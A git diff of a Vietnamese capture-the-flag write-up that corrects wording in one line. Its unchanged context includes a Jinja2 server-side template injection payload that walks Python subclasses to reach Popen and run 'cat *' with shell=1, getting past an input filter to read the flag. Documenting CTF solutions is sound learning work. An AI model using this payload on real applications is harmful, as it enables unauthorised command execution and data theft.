@@ -29,7 +29,7 @@ thành
 ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/2883ff9a-261d-4332-81c6-937c70020427)
 - Bây giờ sửa lại payload từ `ls` sang `cat flag.txt` thôi
 - ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/28f86e01-25e7-4e51-8e67-9e53225a5f43)
-- Và không nó vẫn bị chặn cái gì nên mình sử dụng cách này bypass filter
+- Và không nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter
 - `{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('cat+*',shell=1,stdout=-1)|attr('communicate')()}}`
 - Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag
 ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/2c578c66-f98c-43dd-a306-e629ab3f7137)
